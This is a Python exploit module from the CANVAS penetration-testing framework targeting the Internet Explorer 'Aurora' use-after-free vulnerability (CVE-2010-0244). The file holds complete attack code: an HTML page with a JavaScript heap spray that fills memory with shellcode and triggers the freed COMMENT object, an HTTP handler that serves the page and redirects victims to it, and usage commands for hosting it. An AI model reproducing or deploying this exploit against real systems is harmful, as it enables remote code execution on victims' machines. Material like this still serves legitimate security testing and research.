#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import struct
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

NAME='ie_comments'
DESCRIPTION='Microsoft IE Comments Use-After-Free bug (Aurora)'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='12/25/2009'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/ms10-002.mspx'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2010-0244'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP'] #Not tested on anything but a XP for the moment
PROPERTY['MSADV']='MS10-0??'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
LoL China?

Tested on:
Windows XP Professional KN with SP3 under IE 6 updated.
Might crash from time to time.

Usage (SploitD recommended):
./commandlineInterface.py -p 5555 -v 9
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:ie_comments -l 10.10.11.1 -d 5555 -p 8080 -O httpmosdef:1
"""

CHANGELOG="""
"""

targets={
    0:['Autodetect',0],
}

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.version=0
        self.badstring='\0\xff'
        self.subesp=0
        self.name=NAME 
        self.filename='test.html'
        return

    def makefile(self):
        filedata="""<html>
<body>
<script>var sc=unescape("SHELLCODE");
  var n=unescape("%u0c0d%u0c0d");
  while(n.length<=524288) {n+=n;}
  n=n.substring(0,524269-sc.length);
  var x=new Array();
  for(var i=0;i<200;i++) {x[i]=n+sc;}
  var x1=new Array();
  for (i=0; i<200; i++){
    x1[i]=document.createElement("COMMENT");
    x1[i].data="abc";
  }
  ;
  var e1=null;
  function ev1(evt) {
    e1=document.createEventObject(evt);
    document.getElementById("sp1").innerHTML="";
    window.setInterval(ev2,50);
  }
  function ev2() {
    p="\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d";
    for (i=0; i<x1.length; i++){x1[i].data=p;}
    var t=e1.srcElement;
  }
</script>
<span id="sp1"><IMG SRC="aaa.gif" onload="ev1(event)"></span>
</body>
</html>
""".replace('SHELLCODE',urluencode('AAAA'+self.shellcode)) #'AAAA' is necessary for instructions alignement
        return filedata

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')
            self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count('aaa.gif'):
            self.log('Serving GIF file')
            b.setBody('47494638396101000100910000fffffffffffffe010200000021f904041400ff002c00000000010001000002024401003b'.decode('hex')) #1x1 GIF
            h.addHeader('Content-Type','image/gif')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b
    
    def getArgs(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return
        
    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
